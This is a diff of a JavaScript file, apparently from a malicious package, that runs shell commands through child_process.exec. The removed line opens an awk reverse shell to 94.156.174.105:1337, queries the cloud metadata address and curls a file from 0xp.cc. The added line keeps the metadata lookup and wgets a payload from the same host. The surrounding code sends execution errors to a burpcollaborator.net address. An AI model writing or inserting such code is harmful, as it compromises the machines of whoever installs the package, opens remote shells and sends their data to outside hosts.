@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("nslookup 169.254.169.254; awk 'BEGIN {s = \"\/inet\/tcp\/0\/94.156.174.105\/1337\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' \/dev\/null; curl http://0xp.cc/eee.txt", (error, stdout, stderr) => {
+spawn.exec("nslookup 169.254.169.254; wget http://0xp.cc/eeee", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
